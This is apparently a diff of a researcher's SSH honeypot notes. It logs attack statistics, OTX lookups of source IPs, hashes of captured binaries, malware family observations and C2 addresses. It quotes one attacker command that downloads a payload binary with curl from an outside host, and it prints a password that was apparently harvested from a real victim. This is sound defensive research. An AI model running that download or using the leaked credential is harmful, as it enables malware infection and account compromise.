@@ -1072,3 +1072,94 @@ FINDINGS.md under "Why medium interaction, not low".
 
 Fresh numbers after pull (2026-06-04 21:37 UTC, 226h total):
 4537 auth attempts, 292 source IPs, 1749 sessions, 617621 commands, 13 families.
+
+New day its 10h rabat time
+2026-05-26 11:37 UTC  ->  2026-06-05 08:46 UTC  (237.2h)
+
+        4647  auth attempts
+         303  source IPs
+        1859  sessions accepted
+      673668  commands captured
+
+amine@aminessssPC:~/honeypot/ssh-honeypot$ ls -lh ~/honeypot-logs/2026-06-05.merged/
+total 895M
+-rw-r--r-- 1 amine amine 1022K Jun  5 10:01 auth.log
+-rw-r--r-- 1 amine amine   845 Jun  5 10:01 server.log
+-rw-r--r-- 1 amine amine  894M Jun  5 10:01 session.log 894M wow 
+
+session of F10 recent cdc4751b1aa7 8b76cfa9433f da9ae5a0ce82 7536454ca17f cbd08ab5d046 44bf091b15ae
+
+same ip 45.12.1.4 (ukraine) 9 in 05/06 04/06 02/06 01/06 31/05      8 times in total same files amd64 kal64 kswpad linux still not analysed
+
+using alienvault to know more about the IPs 45.12.1.4 F10 and 176.61.50.14 F13
+https://otx.alienvault.com/indicator/ip/176.61.50.14
+Ireland  
+Indicator Facts from OTX:
+Historical OTX telemetry
+1 domains resolved in all time
+1 top-level domains
+
+honeypot scanner
+attacker-ip honeytrap
+
+https://otx.alienvault.com/indicator/ip/45.12.1.49 Ukraine  
+4 Related Tags
+exploit honeypot vulnerability-exploitation tpot
+
+im considering posting a pulse on alienvault to report all the ips and there TTPS but idk how what TLP to use ....
+
+same sha256sum for the 4 binaries in F10
+amine@aminessssPC:~/honeypot/ssh-honeypot$ sha256sum extracted_da9ae5a0/*.elf
+0ff23a77abba239a50412c720b2e423fcb3fb00e2362189cafa116eeb9bdce27  extracted_da9ae5a0/amd64.elf
+b02337d82c44ed46e5b186bd54cde717be39da81a29fb332090d10a5c444ccb6  extracted_da9ae5a0/kal64.elf
+6fddaa099096c0caee183e4bb95e9fe79003e6ae6dc41d6b1aa3b4aec221bd38  extracted_da9ae5a0/kswpad.elf
+25c34c028f0c119da251ca5d17020df79a030c7c3b86c5a8df699065016a21a2  extracted_da9ae5a0/linux.elf
+amine@aminessssPC:~/honeypot/ssh-honeypot$ sha256sum extracted_eadedac0/amd64 extracted_eadedac0/kal64 extracted_eadedac0/kswpad extracted_eadedac0/linux
+0ff23a77abba239a50412c720b2e423fcb3fb00e2362189cafa116eeb9bdce27  extracted_eadedac0/amd64
+b02337d82c44ed46e5b186bd54cde717be39da81a29fb332090d10a5c444ccb6  extracted_eadedac0/kal64
+6fddaa099096c0caee183e4bb95e9fe79003e6ae6dc41d6b1aa3b4aec221bd38  extracted_eadedac0/kswpad
+25c34c028f0c119da251ca5d17020df79a030c7c3b86c5a8df699065016a21a2  extracted_eadedac0/linux
+
+top ip https://otx.alienvault.com/indicator/ip/71.227.179.172
+usa 
+Indicator Facts from OTX:
+OTX telemetry in last 30 days
+4 domains resolved in last 30 days
+6 domains resolved in all time
+2 top-level domains
+
+
+F12 wowo ip 172.210.53.195 19 auth attempts, 1 sesssion d9ddf36a96d3 duration: 9s  |  41 commands
+curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86  
+https://otx.alienvault.com/indicator/ip/172.210.53.195 France brute force ssh portscan 
+
+
+F11 meow dropper ip  ,34.86.231.37
+https://otx.alienvault.com/indicator/ip/34.86.231.37
+usa 
+Facts from OTX:
+OTX telemetry in last 7 days
+4 dynamic DNS domains
+14 domains resolved in all time
+4 top-level domains
+
+F9 minimal scanner ip
+111.26.6.111 
+https://otx.alienvault.com/indicator/ip/111.26.6.111
+China Indicator Facts from OTX:
+OTX telemetry in last 7 days
+50 pulses 
+
+
+2026-06-16 - 9 day pull, 491h total  its been a while since the last pull cause i was busy with the internship that i just started 
+
+numbers now: 22104 auth attempts, 923 IPs, 19316 sessions, 2544806 commands, 14 families.
+SSHCHK went from 2 sessions (may 30) to 15071. one ip (103.105.67.170) alone did 14793 attempts, 67% of all traffic. never seen it before.
+
+F13 (gJw27HGL worm) hit 4 more times since jun 2, same sha256 every time, same script. still alive.
+
+meow dropper (F11) has 2 new C2 IPs now: 35.237.91.38 and 34.181.210.37 alongside the original 34.11.111.237. 113 sessions total.
+
+new family F14 -- jun 12 12:54 rabat, session eab1131b36ad, ip 185.129.62.63, client SSH-2.0-OpenSSH_9.9 (only real openssh in the whole dataset). dropped 2 test ELF binaries via SCP then deleted them. pulled them from quarantine and strung them: both are literally "hello world" in raw assembly. 512B x86-64 and 348B x86. two syscalls each, write() then exit(). handcrafted, no libc. the point is to test if execution works before sending the real payload. real payload never came. 45min earlier there was a F7 VPS scout from a different IP (85.215.175.242) -- might be coordinated, might not.
+
+credential feedback loop confirmed deeper: 9 passwords now appear in both login attempts AND chpasswd targets. N41+mk##3RKWkK- at 11 login hits is the clearest one -- that password has no business being in a wordlist unless it was harvested from a real victim.
